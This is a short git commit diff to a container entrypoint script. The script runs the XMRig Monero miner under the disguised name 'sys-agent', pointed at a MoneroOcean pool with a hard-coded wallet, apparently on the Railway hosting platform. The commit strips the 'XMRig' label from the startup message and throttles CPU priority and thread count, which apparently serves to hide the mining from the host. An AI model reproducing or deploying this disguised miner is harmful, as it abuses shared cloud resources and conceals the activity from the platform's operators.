646a34c0d92bdbcd1e270c23b6b5c73797757c4a
willy6509 <149163931+willy6509@users.noreply.github.com>
2025-05-17 14:14:53 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,9 +1,7 @@
 #!/bin/sh
 
-echo "Starting sys-agent (XMRig)..."
+echo "=== Starting sys-agent Container on Railway ==="
 exec ./sys-agent \
   -o gulf.moneroocean.stream:10128 \
   -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ \
-  -p worker01 \
-  --donate-level 1 \
-  --randomx-1gb-pages
+  -p worker01 -a rx -k --cpu-priority=1 --threads=2
